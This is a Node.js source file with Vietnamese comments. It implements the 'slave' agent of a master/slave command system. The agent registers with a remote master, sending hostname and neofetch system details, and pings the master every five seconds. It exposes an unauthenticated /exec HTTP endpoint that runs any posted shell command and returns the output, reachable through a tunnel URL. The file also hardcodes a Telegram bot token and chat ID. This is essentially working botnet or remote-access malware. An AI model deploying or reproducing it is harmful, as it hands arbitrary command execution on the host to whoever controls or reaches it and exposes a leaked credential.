const https = require('https');
const express = require('express');
const { exec } = require('child_process');
const os = require('os');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const TOKEN = '7898378784:AAH7RAql823WY3nE25ph28kyO2N20Rhqbts';
const CHAT_ID = '7371969470';
const PORT = Math.floor(Math.random() * 2000) + 8000;
const HOSTNAME = os.hostname();
const MASTER_URL = process.env.MASTER_URL;  // Được thiết lập từ environment

const app = express();
const bot = new TelegramBot(TOKEN);
const startTime = Math.floor(Date.now() / 1000);
let lastPing = Date.now();

// Hàm lấy thông tin Neofetch
const runNeofetch = () => new Promise((resolve, reject) => {
    exec('[ -f neofetch/neofetch ] && ./neofetch/neofetch --stdout || (git clone https://github.com/dylanaraps/neofetch && ./neofetch/neofetch --stdout)', (_, o) => o ? resolve(o.trim()) : reject('Không thể lấy thông tin Neofetch'));
});

app.use(express.json());

// Lệnh nhận từ master và thực thi trên slave
app.post(`/exec`, (req, res) => {
    const { cmd } = req.body;
    if (!cmd) return res.sendStatus(400);

    exec(cmd, (err, stdout, stderr) => {
        if (err || stderr) return res.status(500).send(stderr || err.message);
        res.send(stdout);
    });
});

// Đăng ký slave với master
const registerSlave = async () => {
    try {
        const uptime = await runNeofetch();
        const report = await runNeofetch();
        
        await fetch(`${MASTER_URL}/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                port: PORT,
                url: `https://${HOSTNAME}.loca.lt`,  // Tự động lấy URL từ localtunnel hoặc dịch vụ tunnel bạn sử dụng
                hostname: HOSTNAME,
                uptime,
                report
            })
        });
        
        console.log(`Slave ${HOSTNAME} đã đăng ký thành công.`);
    } catch (error) {
        console.error('Lỗi khi đăng ký slave với master:', error);
    }
};

// Đăng ping tới master để thông báo rằng slave còn hoạt động
const pingMaster = async () => {
    try {
        await fetch(`${MASTER_URL}/ping`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ hostname: HOSTNAME })
        });
        lastPing = Date.now();  // Cập nhật thời gian ping thành công
    } catch (error) {
        console.error('Lỗi khi ping tới master:', error);
    }
};

// Bắt đầu slave
(async () => {
    try {
        if (!MASTER_URL) {
            console.error('❌ Bạn chưa cung cấp MASTER_URL. Hãy chạy master trước!');
            return process.exit(1);
        }

        // Đăng ký slave với master
        await registerSlave();

        // Bắt đầu server express để nhận lệnh
        app.listen(PORT, () => console.log(`🤖 Slave chạy port ${PORT}`));
        
        // Ping master mỗi 5 giây để thông báo slave còn online
        setInterval(pingMaster, 5000);
    } catch (error) {
        console.error('Lỗi khi chạy slave:', error);
    }
})();
